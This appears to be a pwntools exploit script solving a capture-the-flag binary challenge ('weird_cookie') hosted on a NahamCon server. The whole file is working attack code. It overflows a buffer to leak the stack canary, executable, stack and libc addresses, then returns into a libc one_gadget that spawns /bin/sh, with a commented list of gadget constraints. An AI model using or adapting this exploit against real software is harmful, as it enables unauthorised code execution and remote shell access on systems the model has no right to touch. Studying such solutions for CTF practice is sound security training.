#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("weird_cookie_patched")
libc = ELF("./libc-2.27.so")
local = False 
if local:
    p = process("./weird_cookie_patched")
    gdb.attach(p,'''b*main+221\nc\nb*main+221\nc''')
else:
    p = remote('challenge.nahamcon.com', 32735)

elf = context.binary = ELF('./weird_cookie_patched', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

###############
# Leak_canary #
###############
payload = b' '*0x28
sa(b'erflow me?', payload)
p.recvuntil(payload)
canary = int.from_bytes(p.recv(8), 'little')
log.info('Canary:    ' + hex(canary))

#################
# Leak_exe_addr #
#################
exe_addr = int.from_bytes(p.recv(6), 'little')
main = exe_addr - 0xe8
puts_plt = exe_addr - 0x260
puts_got = exe_addr + 0x2d88
memset_got = exe_addr + 0x2d98
log.info('Exe_addr:  ' + hex(exe_addr))
log.info('Main_addr: ' + hex(main))

payload = cyclic(0x28) + p64(canary) + p64(memset_got+0x30) + p64(main)
sa(b'? Try again.', payload)

'''
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

###################
# Leak_stack_addr #
###################
payload = b' '*0x28 + p64(canary) + b'a'*0x10
sa(b'erflow me?', payload)
p.recvuntil(payload)
stack_leak = int.from_bytes(p.recv(6), 'little')
log.info('Stack:     ' + hex(stack_leak))

payload = cyclic(0x28) + p64(canary) + p64(exe_addr+11712+0x30) + p64(main+112)
sa(b'? Try again.', payload)

##################
# Leak_libc_addr #
##################
p.recv(1)
libc.address = int.from_bytes(p.recv(6), 'little') - 4114272
log.info('Libc_base: ' + hex(libc.address))


#############
# get_shell #
#############
''''''
payload = cyclic(0x28) + b'iaaajaaa' + p64(stack_leak+512+0x30) + p64(main+158)
sa(b'? Try again.', payload)

payload = cyclic(0x28) + b'iaaajaaa' + p64(0x0) + p64(libc.address+0x4f302)
s(payload)


p.interactive()